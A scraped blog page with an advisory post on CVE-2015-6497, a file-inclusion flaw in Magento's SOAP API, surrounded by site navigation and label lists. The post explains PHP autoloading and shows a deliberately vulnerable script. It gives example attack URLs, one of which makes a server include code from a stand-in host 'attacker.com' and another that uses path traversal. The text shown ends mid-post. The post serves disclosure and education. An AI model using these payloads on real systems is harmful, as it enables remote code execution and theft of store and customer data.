[Egidio Romano](https://www.blogger.com/profile/14760841123995860416 "author profile")

at

[12:32 AM](https://blog.mindedsecurity.com/2015/09/autoloaded-file-inclusion-in-magento.html "permanent link")

[3 comments
:](https://blog.mindedsecurity.com/2015/09/autoloaded-file-inclusion-in-magento.html#comment-form)

[![](//img2.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=7122745763234660283&postID=8106901234847721037&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=8106901234847721037&target=email "Email This")
[BlogThis!](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=8106901234847721037&target=blog "BlogThis!")
[Share to X](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=8106901234847721037&target=twitter "Share to X")
[Share to Facebook](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=8106901234847721037&target=facebook "Share to Facebook")
[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=8106901234847721037&target=pinterest "Share to Pinterest")

Labels:
[Advisory](https://blog.mindedsecurity.com/search/label/Advisory)
,
[Autoloaded File Inclusion](https://blog.mindedsecurity.com/search/label/Autoloaded%20File%20Inclusion)
,
[CVE-2015-6497](https://blog.mindedsecurity.com/search/label/CVE-2015-6497)
,
[Magento](https://blog.mindedsecurity.com/search/label/Magento)
,
[Remote Code Execution](https://blog.mindedsecurity.com/search/label/Remote%20Code%20Execution)

[Older Posts](https://blog.mindedsecurity.com/search/label/CVE-2015-6497?updated-max=2015-09-11T00:32:00-07:00&max-results=20&start=20&by-date=false "Older Posts")

[Home](https://blog.mindedsecurity.com/)

Subscribe to:
[Posts
(
Atom
)](https://blog.mindedsecurity.com/feeds/posts/default)

##

## Labels

* [3rd party javascript](https://blog.mindedsecurity.com/search/label/3rd%20party%20javascript)
  (
  2
  )
* [absolute path check](https://blog.mindedsecurity.com/search/label/absolute%20path%20check)
  (
  1
  )
* [Adobe](https://blog.mindedsecurity.com/search/label/Adobe)
  (
  3
  )
* [Advisory](https://blog.mindedsecurity.com/search/label/Advisory)
  (
  5
  )
* [adware](https://blog.mindedsecurity.com/search/label/adware)
  (
  1
  )
* [AFNetworking](https://blog.mindedsecurity.com/search/label/AFNetworking)
  (
  1
  )
* [agile](https://blog.mindedsecurity.com/search/label/agile)
  (
  1
  )
* [AMT](https://blog.mindedsecurity.com/search/label/AMT)
  (
  1
  )
* [Android](https://blog.mindedsecurity.com/search/label/Android)
  (
  1
  )
* [Android Security](https://blog.mindedsecurity.com/search/label/Android%20Security)
  (
  6
  )
* [Anti-Tampering](https://blog.mindedsecurity.com/search/label/Anti-Tampering)
  (
  2
  )
* [Antitamper](https://blog.mindedsecurity.com/search/label/Antitamper)
  (
  2
  )
* [Applet Security](https://blog.mindedsecurity.com/search/label/Applet%20Security)
  (
  6
  )
* [Application Security](https://blog.mindedsecurity.com/search/label/Application%20Security)
  (
  23
  )
* [appsec](https://blog.mindedsecurity.com/search/label/appsec)
  (
  1
  )
* [Arbitrary Code Execution](https://blog.mindedsecurity.com/search/label/Arbitrary%20Code%20Execution)
  (
  4
  )
* [architecture](https://blog.mindedsecurity.com/search/label/architecture)
  (
  1
  )
* [asp.net](https://blog.mindedsecurity.com/search/label/asp.net)
  (
  2
  )
* [ast](https://blog.mindedsecurity.com/search/label/ast)
  (
  1
  )
* [attacks](https://blog.mindedsecurity.com/search/label/attacks)
  (
  1
  )
* [Authentication](https://blog.mindedsecurity.com/search/label/Authentication)
  (
  1
  )
* [Autoloaded File Inclusion](https://blog.mindedsecurity.com/search/label/Autoloaded%20File%20Inclusion)
  (
  1
  )
* [Automotive](https://blog.mindedsecurity.com/search/label/Automotive)
  (
  1
  )
* [Banking](https://blog.mindedsecurity.com/search/label/Banking)
  (
  4
  )
* [Banking Malware](https://blog.mindedsecurity.com/search/label/Banking%20Malware)
  (
  1
  )
* [blackbox](https://blog.mindedsecurity.com/search/label/blackbox)
  (
  1
  )
* [blueclosure](https://blog.mindedsecurity.com/search/label/blueclosure)
  (
  1
  )
* [burp](https://blog.mindedsecurity.com/search/label/burp)
  (
  1
  )
* [canonicalization](https://blog.mindedsecurity.com/search/label/canonicalization)
  (
  1
  )
* [Certificate Pinning](https://blog.mindedsecurity.com/search/label/Certificate%20Pinning)
  (
  1
  )
* [chat](https://blog.mindedsecurity.com/search/label/chat)
  (
  1
  )
* [Client Side HTTP Parameter Pollution](https://blog.mindedsecurity.com/search/label/Client%20Side%20HTTP%20Parameter%20Pollution)
  (
  1
  )
* [cloud](https://blog.mindedsecurity.com/search/label/cloud)
  (
  1
  )
* [cloud browsing](https://blog.mindedsecurity.com/search/label/cloud%20browsing)
  (
  1
  )
* [Code Protection](https://blog.mindedsecurity.com/search/label/Code%20Protection)
  (
  2
  )
* [compliance](https://blog.mindedsecurity.com/search/label/compliance)
  (
  1
  )
* [Concrete5](https://blog.mindedsecurity.com/search/label/Concrete5)
  (
  1
  )
* [Content Security Policy](https://blog.mindedsecurity.com/search/label/Content%20Security%20Policy)
  (
  1
  )
* [CORS](https://blog.mindedsecurity.com/search/label/CORS)
  (
  1
  )
* [Cross Site Scripting](https://blog.mindedsecurity.com/search/label/Cross%20Site%20Scripting)
  (
  7
  )
* CVE-2015-6497

  (
  1
  )
* [CVE-2021-44228](https://blog.mindedsecurity.com/search/label/CVE-2021-44228)
  (
  1
  )
* [DAB](https://blog.mindedsecurity.com/search/label/DAB)
  (
  1
  )
* [defense](https://blog.mindedsecurity.com/search/label/defense)
  (
  1
  )
* [deobfuscation](https://blog.mindedsecurity.com/search/label/deobfuscation)
  (
  2
  )
* [DeviceSecurity](https://blog.mindedsecurity.com/search/label/DeviceSecurity)
  (
  2
  )
* [DEVSECOPS](https://blog.mindedsecurity.com/search/label/DEVSECOPS)
  (
  1
  )
* [dll](https://blog.mindedsecurity.com/search/label/dll)
  (
  1
  )
* [DNS Rebinding](https://blog.mindedsecurity.com/search/label/DNS%20Rebinding)
  (
  2
  )
* [DOM Based XSS](https://blog.mindedsecurity.com/search/label/DOM%20Based%20XSS)
  (
  9
  )
* [Dom Xss](https://blog.mindedsecurity.com/search/label/Dom%20Xss)
  (
  15
  )
* [DOMinator](https://blog.mindedsecurity.com/search/label/DOMinator)
  (
  11
  )
* [DOMinatorPro](https://blog.mindedsecurity.com/search/label/DOMinatorPro)
  (
  9
  )
* [download](https://blog.mindedsecurity.com/search/label/download)
  (
  1
  )
* [Dyre](https://blog.mindedsecurity.com/search/label/Dyre)
  (
  1
  )
* [Encryption](https://blog.mindedsecurity.com/search/label/Encryption)
  (
  3
  )
* [Expression Language Injection](https://blog.mindedsecurity.com/search/label/Expression%20Language%20Injection)
  (
  3
  )
* [fixing](https://blog.mindedsecurity.com/search/label/fixing)
  (
  1
  )
* [Flex](https://blog.mindedsecurity.com/search/label/Flex)
  (
  2
  )
* [Flutter](https://blog.mindedsecurity.com/search/label/Flutter)
  (
  1
  )
* [gameover](https://blog.mindedsecurity.com/search/label/gameover)
  (
  1
  )
* [Google Plus One](https://blog.mindedsecurity.com/search/label/Google%20Plus%20One)
  (
  1
  )
* [google security](https://blog.mindedsecurity.com/search/label/google%20security)
  (
  1
  )
* [Http Parameter Pollution](https://blog.mindedsecurity.com/search/label/Http%20Parameter%20Pollution)
  (
  2
  )
* [Http Request Splitting](https://blog.mindedsecurity.com/search/label/Http%20Request%20Splitting)
  (
  1
  )
* [Information Disclosure](https://blog.mindedsecurity.com/search/label/Information%20Disclosure)
  (
  2
  )
* [innovation](https://blog.mindedsecurity.com/search/label/innovation)
  (
  2
  )
* [intruder](https://blog.mindedsecurity.com/search/label/intruder)
  (
  1
  )
* [iOS](https://blog.mindedsecurity.com/search/label/iOS)
  (
  2
  )
* [iOS Security](https://blog.mindedsecurity.com/search/label/iOS%20Security)
  (
  7
  )
* [IoT](https://blog.mindedsecurity.com/search/label/IoT)
  (
  2
  )
* [ISO21434](https://blog.mindedsecurity.com/search/label/ISO21434)
  (
  1
  )
* [J2EE](https://blog.mindedsecurity.com/search/label/J2EE)
  (
  1
  )
* [Java](https://blog.mindedsecurity.com/search/label/Java)
  (
  5
  )
* [Java Faces](https://blog.mindedsecurity.com/search/label/Java%20Faces)
  (
  1
  )
* [Java Security](https://blog.mindedsecurity.com/search/label/Java%20Security)
  (
  2
  )
* [javascript](https://blog.mindedsecurity.com/search/label/javascript)
  (
  4
  )
* [JavaScript Security](https://blog.mindedsecurity.com/search/label/JavaScript%20Security)
  (
  2
  )
* [JNLP Security](https://blog.mindedsecurity.com/search/label/JNLP%20Security)
  (
  1
  )
* [jQuery](https://blog.mindedsecurity.com/search/label/jQuery)
  (
  2
  )
* [JSON](https://blog.mindedsecurity.com/search/label/JSON)
  (
  1
  )
* [Libraries Security](https://blog.mindedsecurity.com/search/label/Libraries%20Security)
  (
  1
  )
* [Liferay](https://blog.mindedsecurity.com/search/label/Liferay)
  (
  1
  )
* [Linkedin.com](https://blog.mindedsecurity.com/search/label/Linkedin.com)
  (
  1
  )
* [Log4J](https://blog.mindedsecurity.com/search/label/Log4J)
  (
  1
  )
* [Magento](https://blog.mindedsecurity.com/search/label/Magento)
  (
  1
  )
* [malware](https://blog.mindedsecurity.com/search/label/malware)
  (
  9
  )
* [malware detector](https://blog.mindedsecurity.com/search/label/malware%20detector)
  (
  1
  )
* [MAPT](https://blog.mindedsecurity.com/search/label/MAPT)
  (
  4
  )
* [maxthon](https://blog.mindedsecurity.com/search/label/maxthon)
  (
  1
  )
* [microservices](https://blog.mindedsecurity.com/search/label/microservices)
  (
  1
  )
* [MitM](https://blog.mindedsecurity.com/search/label/MitM)
  (
  2
  )
* [Mobile](https://blog.mindedsecurity.com/search/label/Mobile)
  (
  5
  )
* [Mobile Security](https://blog.mindedsecurity.com/search/label/Mobile%20Security)
  (
  4
  )
* [MSTG](https://blog.mindedsecurity.com/search/label/MSTG)
  (
  3
  )
* [mvc](https://blog.mindedsecurity.com/search/label/mvc)
  (
  1
  )
* [Obfuscation](https://blog.mindedsecurity.com/search/label/Obfuscation)
  (
  3
  )
* [Omniture](https://blog.mindedsecurity.com/search/label/Omniture)
  (
  2
  )
* [Oracle NetBeans](https://blog.mindedsecurity.com/search/label/Oracle%20NetBeans)
  (
  1
  )
* [OWASP](https://blog.mindedsecurity.com/search/label/OWASP)
  (
  6
  )
* [OWASP 5D](https://blog.mindedsecurity.com/search/label/OWASP%205D)
  (
  2
  )
* [OWASP SAMM](https://blog.mindedsecurity.com/search/label/OWASP%20SAMM)
  (
  2
  )
* [OWASP Summit](https://blog.mindedsecurity.com/search/label/OWASP%20Summit)
  (
  1
  )
* [OWASP Top Ten](https://blog.mindedsecurity.com/search/label/OWASP%20Top%20Ten)
  (
  3
  )
* [p2p encryption](https://blog.mindedsecurity.com/search/label/p2p%20encryption)
  (
  1
  )
* [path traversal](https://blog.mindedsecurity.com/search/label/path%20traversal)
  (
  3
  )
* [peer to peer encryption](https://blog.mindedsecurity.com/search/label/peer%20to%20peer%20encryption)
  (
  1
  )
* [Polyglots](https://blog.mindedsecurity.com/search/label/Polyglots)
  (
  1
  )
* [Primefaces](https://blog.mindedsecurity.com/search/label/Primefaces)
  (
  1
  )
* [privacy](https://blog.mindedsecurity.com/search/label/privacy)
  (
  1
  )
* [puffin](https://blog.mindedsecurity.com/search/label/puffin)
  (
  1
  )
* [RAT](https://blog.mindedsecurity.com/search/label/RAT)
  (
  1
  )
* [RAT WARS](https://blog.mindedsecurity.com/search/label/RAT%20WARS)
  (
  1
  )
* [RATDET](https://blog.mindedsecurity.com/search/label/RATDET)
  (
  1
  )
* [RATWARS](https://blog.mindedsecurity.com/search/label/RATWARS)
  (
  1
  )
* [RDS](https://blog.mindedsecurity.com/search/label/RDS)
  (
  1
  )
* [Remote Code Execution](https://blog.mindedsecurity.com/search/label/Remote%20Code%20Execution)
  (
  3
  )
* [remote working](https://blog.mindedsecurity.com/search/label/remote%20working)
  (
  1
  )
* [reverse engineering](https://blog.mindedsecurity.com/search/label/reverse%20engineering)
  (
  1
  )
* [Same Origin Policy](https://blog.mindedsecurity.com/search/label/Same%20Origin%20Policy)
  (
  1
  )
* [sanitization](https://blog.mindedsecurity.com/search/label/sanitization)
  (
  1
  )
* [sast](https://blog.mindedsecurity.com/search/label/sast)
  (
  3
  )
* [Screen Control](https://blog.mindedsecurity.com/search/label/Screen%20Control)
  (
  1
  )
* [screenshot security](https://blog.mindedsecurity.com/search/label/screenshot%20security)
  (
  2
  )
* [SDL](https://blog.mindedsecurity.com/search/label/SDL)
  (
  2
  )
* [security](https://blog.mindedsecurity.com/search/label/security)
  (
  2
  )
* [security tools](https://blog.mindedsecurity.com/search/label/security%20tools)
  (
  1
  )
* [semgrep](https://blog.mindedsecurity.com/search/label/semgrep)
  (
  3
  )
* [Sharepoint](https://blog.mindedsecurity.com/search/label/Sharepoint)
  (
  1
  )
* [slack](https://blog.mindedsecurity.com/search/label/slack)
  (
  1
  )
* [Software Security Governance](https://blog.mindedsecurity.com/search/label/Software%20Security%20Governance)
  (
  1
  )
* [source code](https://blog.mindedsecurity.com/search/label/source%20code)
  (
  1
  )
* [Spring MVC](https://blog.mindedsecurity.com/search/label/Spring%20MVC)
  (
  1
  )
* [SQL Injection](https://blog.mindedsecurity.com/search/label/SQL%20Injection)
  (
  1
  )
* [SSL](https://blog.mindedsecurity.com/search/label/SSL)
  (
  2
  )
* [static analysis](https://blog.mindedsecurity.com/search/label/static%20analysis)
  (
  1
  )
* [Stored DOM Based XSS](https://blog.mindedsecurity.com/search/label/Stored%20DOM%20Based%20XSS)
  (
  1
  )
* [STRATEGY](https://blog.mindedsecurity.com/search/label/STRATEGY)
  (
  1
  )
* [superfish](https://blog.mindedsecurity.com/search/label/superfish)
  (
  1
  )
* [Supply Chain Security](https://blog.mindedsecurity.com/search/label/Supply%20Chain%20Security)
  (
  1
  )
* [SVG](https://blog.mindedsecurity.com/search/label/SVG)
  (
  1
  )
* [Swift](https://blog.mindedsecurity.com/search/label/Swift)
  (
  1
  )
* [TARA](https://blog.mindedsecurity.com/search/label/TARA)
  (
  1
  )
* [Telerik UI](https://blog.mindedsecurity.com/search/label/Telerik%20UI)
  (
  1
  )
* [TESTABLE](https://blog.mindedsecurity.com/search/label/TESTABLE)
  (
  1
  )
* [testing](https://blog.mindedsecurity.com/search/label/testing)
  (
  1
  )
* [Threat Modeling](https://blog.mindedsecurity.com/search/label/Threat%20Modeling)
  (
  1
  )
* [twitter](https://blog.mindedsecurity.com/search/label/twitter)
  (
  1
  )
* [UNECE R155](https://blog.mindedsecurity.com/search/label/UNECE%20R155)
  (
  1
  )
* [unzip directory traversal](https://blog.mindedsecurity.com/search/label/unzip%20directory%20traversal)
  (
  1
  )
* [UPnP](https://blog.mindedsecurity.com/search/label/UPnP)
  (
  2
  )
* [validation](https://blog.mindedsecurity.com/search/label/validation)
  (
  1
  )
* [Vulnerabilities statistics](https://blog.mindedsecurity.com/search/label/Vulnerabilities%20statistics)
  (
  1
  )
* [WAF](https://blog.mindedsecurity.com/search/label/WAF)
  (
  1
  )
* [WAPT](https://blog.mindedsecurity.com/search/label/WAPT)
  (
  1
  )
* [Web Application Firewall](https://blog.mindedsecurity.com/search/label/Web%20Application%20Firewall)
  (
  1
  )
* [web architecture security](https://blog.mindedsecurity.com/search/label/web%20architecture%20security)
  (
  1
  )
* [Web Attacks](https://blog.mindedsecurity.com/search/label/Web%20Attacks)
  (
  23
  )
* [web cache](https://blog.mindedsecurity.com/search/label/web%20cache)
  (
  1
  )
* [web injection](https://blog.mindedsecurity.com/search/label/web%20injection)
  (
  4
  )
* [Web Security](https://blog.mindedsecurity.com/search/label/Web%20Security)
  (
  23
  )
* [Windows Phone Security](https://blog.mindedsecurity.com/search/label/Windows%20Phone%20Security)
  (
  1
  )
* [WWeb Security](https://blog.mindedsecurity.com/search/label/WWeb%20Security)
  (
  2
  )
* [zeus p2p](https://blog.mindedsecurity.com/search/label/zeus%20p2p)
  (
  3
  )

## Blog Archive

* [May](https://blog.mindedsecurity.com/2024/05/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2024/04/)
  (
  1
  )
* [March](https://blog.mindedsecurity.com/2024/03/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2023/10/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2023/06/)
  (
  1
  )
* [March](https://blog.mindedsecurity.com/2023/03/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2023/02/)
  (
  1
  )
* [July](https://blog.mindedsecurity.com/2022/07/)
  (
  1
  )
* [December](https://blog.mindedsecurity.com/2021/12/)
  (
  1
  )
* [August](https://blog.mindedsecurity.com/2021/08/)
  (
  1
  )
* [May](https://blog.mindedsecurity.com/2021/05/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2021/02/)
  (
  1
  )
* [January](https://blog.mindedsecurity.com/2021/01/)
  (
  1
  )
* [November](https://blog.mindedsecurity.com/2020/11/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2020/10/)
  (
  1
  )
* [July](https://blog.mindedsecurity.com/2020/07/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2020/06/)
  (
  1
  )
* [May](https://blog.mindedsecurity.com/2020/05/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2020/04/)
  (
  1
  )
* [March](https://blog.mindedsecurity.com/2020/03/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2020/02/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2019/04/)
  (
  2
  )
* [October](https://blog.mindedsecurity.com/2018/10/)
  (
  3
  )
* [September](https://blog.mindedsecurity.com/2018/09/)
  (
  3
  )
* [July](https://blog.mindedsecurity.com/2018/07/)
  (
  1
  )
* [May](https://blog.mindedsecurity.com/2018/05/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2018/04/)
  (
  2
  )
* [November](https://blog.mindedsecurity.com/2017/11/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2017/06/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2016/02/)
  (
  2
  )
* [January](https://blog.mindedsecurity.com/2016/01/)
  (
  1
  )
* [November](https://blog.mindedsecurity.com/2015/11/)
  (
  2
  )
* [October](https://blog.mindedsecurity.com/2015/10/)
  (
  1
  )
* [September](https://blog.mindedsecurity.com/2015/09/)
  (
  1
  )
* [August](https://blog.mindedsecurity.com/2015/08/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2015/06/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2015/04/)
  (
  2
  )
* [March](https://blog.mindedsecurity.com/2015/03/)
  (
  4
  )
* [February](https://blog.mindedsecurity.com/2015/02/)
  (
  1
  )
* [September](https://blog.mindedsecurity.com/2014/09/)
  (
  1
  )
* [August](https://blog.mindedsecurity.com/2014/08/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2014/06/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2013/10/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2013/04/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2013/02/)
  (
  2
  )
* [November](https://blog.mindedsecurity.com/2012/11/)
  (
  2
  )
* [October](https://blog.mindedsecurity.com/2012/10/)
  (
  3
  )
* [September](https://blog.mindedsecurity.com/2012/09/)
  (
  4
  )
* [June](https://blog.mindedsecurity.com/2012/06/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2011/10/)
  (
  1
  )
* [September](https://blog.mindedsecurity.com/2011/09/)
  (
  1
  )
* [August](https://blog.mindedsecurity.com/2011/08/)
  (
  2
  )
* [July](https://blog.mindedsecurity.com/2011/07/)
  (
  2
  )
* [May](https://blog.mindedsecurity.com/2011/05/)
  (
  2
  )
* [April](https://blog.mindedsecurity.com/2011/04/)
  (
  2
  )
* [March](https://blog.mindedsecurity.com/2011/03/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2010/10/)
  (
  8
  )
* [September](https://blog.mindedsecurity.com/2010/09/)
  (
  3
  )
* [August](https://blog.mindedsecurity.com/2010/08/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2010/06/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2010/04/)
  (
  4
  )
* [March](https://blog.mindedsecurity.com/2010/03/)
  (
  1
  )
* [December](https://blog.mindedsecurity.com/2009/12/)
  (
  1
  )
* [November](https://blog.mindedsecurity.com/2009/11/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2009/10/)
  (
  1
  )
* [May](https://blog.mindedsecurity.com/2009/05/)
  (
  4
  )
* [February](https://blog.mindedsecurity.com/2009/02/)
  (
  2
  )
* [January](https://blog.mindedsecurity.com/2009/01/)
  (
  1
  )

####

Minded Security was established in Italy in 2007

with a focus on supporting businesses and

organizations to build secure products
 and services.

##### Services

* Training
* Testing
* Consulting
* Request a brochure

##### Information

* The Company
* blueclosure
* AMT – Banking Malware Detector
* Contact us
* Privacy Policy

##### Newsletter

©2015 Minded Security S.r.l. The Software Security Company - VAT IT05756380480

[Back to top](#top)



=== Content from blog.mindedsecurity.com_04cffa1e_20250126_020835.html ===


[Subscribe our newsletter](https://mindedsecurity.com/newsletter)

[Minded Security](https://mindedsecurity.com)

* Industry
  + [Automotive/Maritime](https://mindedsecurity.com/industry/automotive-maritime/ "Automotive/Maritime")
  + [Financial](https://mindedsecurity.com/industry/financial/ "Financial")
  + [GDO](https://mindedsecurity.com/industry/gdo/ "GDO")
  + [Industrial Control Systems](https://mindedsecurity.com/industry/industrial-control-systems/ "Industrial Control Systems")
  + [IoT Security](https://mindedsecurity.com/industry/iot-security/ "IoT Security")
  + [Healthcare](https://mindedsecurity.com/industry/healthcare/ "Healthcare")
  + [Government](https://mindedsecurity.com/industry/government/ "Government")
* [Services](https://mindedsecurity.com/our-services/ "Services")
  + [Training](https://mindedsecurity.com/our-services/training/ "Training")
    - [Security Hackaton](https://mindedsecurity.com/services/training/security-hackaton/ "Security Hackaton")
    - [Advanced On-site Training](https://mindedsecurity.com/services/training/advanced-on-site-training/ "Advanced On-site Training")
    - [BlueClosure Training](https://mindedsecurity.com/services/training/blueclosure-training/ "BlueClosure Training")
    - [High Level Training](https://mindedsecurity.com/services/training/high-level-training/ "High Level Training")
    - [Webinar](https://mindedsecurity.com/services/training/webinar/ "Webinar")
  + [Testing](https://mindedsecurity.com/our-services/testing/ "Testing")
    - [Manual Secure Code Review](https://mindedsecurity.com/services/testing/manual-secure-code-review/ "Manual Secure Code Review")
    - [Manual WAPT](https://mindedsecurity.com/services/testing/manual-wapt/ "Manual WAPT")
    - [Cloud Security Testing](https://mindedsecurity.com/services/testing/cloud-security-testing/ "Cloud Security Testing")
    - [IoT Security](https://mindedsecurity.com/services/testing/iot-security/ "IoT Security")
    - [API Security](https://mindedsecurity.com/services/testing/api-security/ "API Security")
    - [Mobile Security Assessment](https://mindedsecurity.com/services/testing/mobile-security-assessment/ "Mobile Security Assessment")
    - [Client Side Assessment](https://mindedsecurity.com/services/testing/client-side-assessment/ "Client Side Assessment")
  + [Consulting](https://mindedsecurity.com/our-services/consulting/ "Consulting")
    - [Software Security Advisory](https://mindedsecurity.com/services/consulting/software-security-advisory/ "Software Security Advisory")
    - [5D Framework](https://mindedsecurity.com/services/consulting/5d-framework/ "5D Framework")
    - [Threat Modeling](https://mindedsecurity.com/services/consulting/threat-modeling/ "Threat Modeling")
    - [Secure Design](https://mindedsecurity.com/services/consulting/secure-design/ "Secure Design")
    - [Secure Architecture Review](https://mindedsecurity.com/services/consulting/secure-architecture-review/ "Secure Architecture Review")
    - [Secure Coding Guidelines](https://mindedsecurity.com/services/consulting/secure-coding-guidelines/ "Secure Coding Guidelines")
    - [Fixing Support](https://mindedsecurity.com/services/consulting/fixing-support/ "Fixing Support")
    - [Outsourcing Development Governance](https://mindedsecurity.com/services/consulting/outsourcing-development-governance/ "Outsourcing Development Governance")
  + [Request a brochure](https://mindedsecurity.com/request-a-brochure/ "Request a brochure")
* Resources
  + [Blog](https://blog.mindedsecurity.com/ "Blog")
  + [News](https://mindedsecurity.com/category/news/ "News")
  + [Videos](https://mindedsecurity.com/videos/ "Videos")
  + [Research](https://mindedsecurity.com/research/ "Research")
  + [Advisories](https://mindedsecurity.com/research/advisories/ "Advisories")
* [About us](https://mindedsecurity.com/our-mission/ "About us")
  + [The Company](https://mindedsecurity.com/the-company/ "The Company")
  + [Contact us](https://mindedsecurity.com/contact-us/ "Contact us")
  + [Newsletter](https://mindedsecurity.com/newsletter/ "Newsletter")
  + [Jobs](https://mindedsecurity.com/jobs/ "Jobs")
  + [Privacy Policy](https://mindedsecurity.com/privacy-policy/ "Privacy Policy")

## IMQ Minded Security Blog

[skip to main](#main)  |
[skip to sidebar](#sidebar)

Showing posts with label **Autoloaded File Inclusion**. [Show all posts](https://blog.mindedsecurity.com/)

Showing posts with label **Autoloaded File Inclusion**. [Show all posts](https://blog.mindedsecurity.com/)

## Friday, September 11, 2015

# [Autoloaded File Inclusion in Magento SOAP API (SUPEE-6482)](https://blog.mindedsecurity.com/2015/09/autoloaded-file-inclusion-in-magento.html)

This past February we reported an interesting and quite overlooked kind of vulnerability in the [Magento](http://magento.com/) web e-commerce platform. The vulnerability might allow an authenticated attacker to execute arbitrary code on the affected web stores, and this can lead to a complete compromise, including credit card information and personal data theft. We received the first reply from the Magento Security Team on June 22, 2015, stating that our submission was not eligible for the bug bounty program, because it was found to be invalid and not actionable. The reason for the rejection was that there are too many requirements to exploit the vulnerability, first of all it requires that Magento is running on outdated PHP versions, because this kind of vulnerability has been fixed in the PHP core engine at the beginning of 2014. However, as we will see in this post, there are still many websites out there using such outdated PHP versions. That should be one of the reasons why the Magento Security Team replied us on June 25, 2015, stating the following:
> *We were able to confirm your issue. Even though it requires knowing API credentials, it should not be possible to execute such actions. The PHP versions that are additionally vulnerable, while old are still used in popular distributions like RHEL 7.1.* *We will schedule fixing this issue for our next product release given lower priority. We will inform you regarding possible awards associated with this report.*

On August 4, 2015, a bundle of patches ([SUPEE-6482](http://magento.com/security/patches/supee-6482)) has been released by the Magento team, that resolved several security-related issues, including the one we reported in February. The same day Magento released new versions (Community Edition 1.9.2.1 and Enterprise Edition 1.14.2.1) that include SUPEE-6482 along with other security patches. On August 13, 2015, we requested a new CVE identifier for this vulnerability, and MITRE has assigned the name [CVE-2015-6497](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2015-6497) for it.

### **What is an "Autoloaded File Inclusion" vulnerability?**

This kind of vulnerability might affect PHP applications which uses an "exploitable" autoloading mechanism. The "[Autoloading Classes](http://php.net/manual/en/language.oop5.autoload.php)" feature has been introduced in PHP 5.0 with the magic function *\_\_autoload()* which is automatically called when your code references a class or interface that hasn’t been loaded yet. So, instead of including every needed class by hand, is it possible to register a function that gets called as soon as the code try to instantiate an unknown class. This function gets passed the unknown class name and is responsible for including the right file that contains the class definition. As an aside, starting from PHP 5.1.2 autoload-functions are usually registered via [*spl\_autoload\_register()*](http://php.net/manual/en/function.spl-autoload-register.php), which provides a more flexible alternative for autoloading classes. For this reason, using *\_\_autoload()* is discouraged and may be deprecated in the future. Here’s an example of an extremely basic *\_\_autoload()* implementation, which attempts to load the classes MyClass1 and MyClass2 from the files MyClass1.php and MyClass2.php respectively (it's taken from the official PHP documentation page):

```
<?php

 function __autoload($class_name) {
    include $class_name . '.php';
 }

 $obj  = new MyClass1();
 $obj2 = new MyClass2();

?>
```

While this feature is extremely useful and powerful, it might introduce potential local/remote file inclusion vulnerabilities when user-controlled input is used as a class name. Indeed, if an attacker can control the class name variable passed to an autoloading function, she could try to play around with it in order to include an arbitrary file and execute PHP code remotely. There are multiple ways to trigger the autoloader, the most obvious is class instantiation using the ***new*** operator. In addition to that, there are some PHP functions which can be considered as *sensitive sinks* for this kind of vulnerability. Here is an incomplete list:

* [class\_exists()](http://php.net/manual/en/function.class-exists.php)
* [interface\_exists()](http://php.net/manual/en/function.interface-exists.php)
* [method\_exists()](http://php.net/manual/en/function.method-exists.php)
* [property\_exists()](http://php.net/manual/en/function.property-exists.php)
* [is\_subclass\_of()](http://php.net/manual/en/function.is-subclass-of.php)
* ...

So, when user-controlled input (*tainted data*) enters one of these *sensitive sinks* there's a chance for the application to be vulnerable to "Autoloaded File Inclusion". Let's see a trivial example of vulnerable scripts:

```
<?php

 /* File: autoload.php */

 function __autoload($class_name) {
    include $class_name . '.php';
 }

?>
```

```
<?php

 /* File: vuln.php */

 require('autoload.php');

 if(isset($_GET['class']) && class_exists($_GET['class'])) {
    $obj = new $_GET['class'];
 } else {
    die('No class found');
 }

 /* Some code... */

?>
```

In this example an attacker controls a class name via the GET parameter "class", which is first used with the *class\_exists()* function (triggering the autoloader in case it is an unknown class) and then to instantiate a new object. This means that the attacker can control the *$class\_name* variable passed to the autoloader, therefore it could be possible to include arbitrary files from both local or remote resources by invoking URLs like these:

> **http://example.com/vuln.php?class=http://attacker.com/shell**
>
> **http://example.com/vuln.php?class=../../../tmp/cache/attacker\_controlled/file**

In the first case the autoloader will try to include and execute the PHP code located at *http://attacker.com/shell.php*, resulting in a Remote File Inclusion (RFI); while in the second case the autoloader will try to include and execute the PHP code located into the file */tmp/cache/attacker\_controlled/file.php*, resulting in a Local File Inclusion (LFI). Furthermore, in cases like this where the attacker controls the classname's prefix, in addition to http:// other [PHP wrappers](http://php.net/manual/en/wrappers.php) might be abused in order to execute arbitrary PHP code.

